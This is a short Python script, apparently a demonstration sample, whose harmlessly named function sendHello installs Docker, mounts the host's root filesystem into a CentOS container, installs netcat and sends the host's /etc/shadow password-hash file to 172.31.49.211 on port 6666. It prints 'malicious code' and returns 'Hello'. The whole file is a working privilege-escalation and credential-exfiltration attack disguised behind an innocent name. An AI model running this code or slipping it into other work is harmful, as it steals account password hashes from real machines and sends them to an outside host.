def sendHello():
    from subprocess import call
    call(["yum", "-y", "install", "docker"])
    call(["docker", "run", "-dt", "-v", "/:/var/tmp", "--name", "PE", "-h", "PE", "centos", "/bin/bash"])
    call(["docker", "exec", "PE", "yum", "-y", "install", "nc"])
    call(["docker","exec","PE","bash","-c", 'cat /var/tmp/etc/shadow | nc 172.31.49.211 6666']) 
    print "malicious code"
    return "Hello"

if __name__ == '__main__':
    a = sendHello()
    print a
